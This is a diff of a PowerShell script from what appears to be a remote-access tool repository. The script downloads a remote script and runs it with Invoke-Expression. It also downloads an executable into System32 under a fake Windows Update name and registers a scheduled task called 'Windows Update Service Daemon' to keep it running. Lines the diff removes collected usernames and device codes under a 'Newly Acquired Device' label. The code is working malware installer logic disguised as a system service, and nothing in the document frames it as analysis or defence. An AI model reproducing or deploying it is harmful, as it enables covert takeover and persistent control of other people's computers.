@@ -1,25 +1,17 @@
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $localFilePath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe"
-$urlforping = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/WindowsDiscordPingStatus.exe"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordPingBotNewAcquisitions.exe"
+$pingdaemontask = "Windows Update Service Daemon"
 $urlfortc = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1"
-$pingpreampdaemon = "Windows Update Service Daemon"
-$regPath = "HKLM:\SOFTWARE\Microsoft\WindowsUpdateService"
-$regpreampd = "HKLM:\SOFTWARE\Microsoft\MicrosoftUpdateServiceDaemon"
 Invoke-Expression (Invoke-WebRequest -Uri $urlfortc -UseBasicParsing).Content
 if (Test-Path -Path $localFilePath -PathType Leaf) {
     Remove-Item -Path $localFilePath -Force
 }
 try {
-	Invoke-WebRequest -Uri $urlforping -OutFile $localFilePath -UseBasicParsing
+    Invoke-WebRequest -Uri $url -OutFile $localFilePath -UseBasicParsing
 } catch {}
-New-Item -Path $regpreampd -Force | Out-Null
-$code = (Get-ItemProperty -Path $regPath).Code
-$Data = (Get-ItemProperty -Path $regPath).Data
-$username = Get-WmiObject -Class Win32_UserProfile | Where-Object { $_.Special -eq $false } | ForEach-Object { $_.LocalPath.Split('\')[-1] }
-$combineddata = "Newly Acquired Device **$code**, Status **$Data**, Userser **$username**"
-Set-ItemProperty -Path $regpreampd -Name 'Name' -Value $combineddata
 #Create Windows Scheduled task
-$pingpreampdaemonxml = @"
+$pingdaemonxml = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
@@ -71,8 +63,8 @@ $pingpreampdaemonxml = @"
   </Actions>
 </Task>
 "@
-if (Get-ScheduledTask -TaskName $pingpreampdaemon -ErrorAction SilentlyContinue) {
-Unregister-ScheduledTask -TaskName $pingpreampdaemon -Confirm:$false
+if (Get-ScheduledTask -TaskName $pingdaemontask -ErrorAction SilentlyContinue) {
+Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
 } else {}
-Register-ScheduledTask -Xml $pingpreampdaemonxml -TaskName $pingpreampdaemon | Out-Null
-Start-ScheduledTask -TaskName $pingpreampdaemon
+Register-ScheduledTask -Xml $pingdaemonxml -TaskName $pingdaemontask | Out-Null
+Start-ScheduledTask -TaskName $pingdaemontask
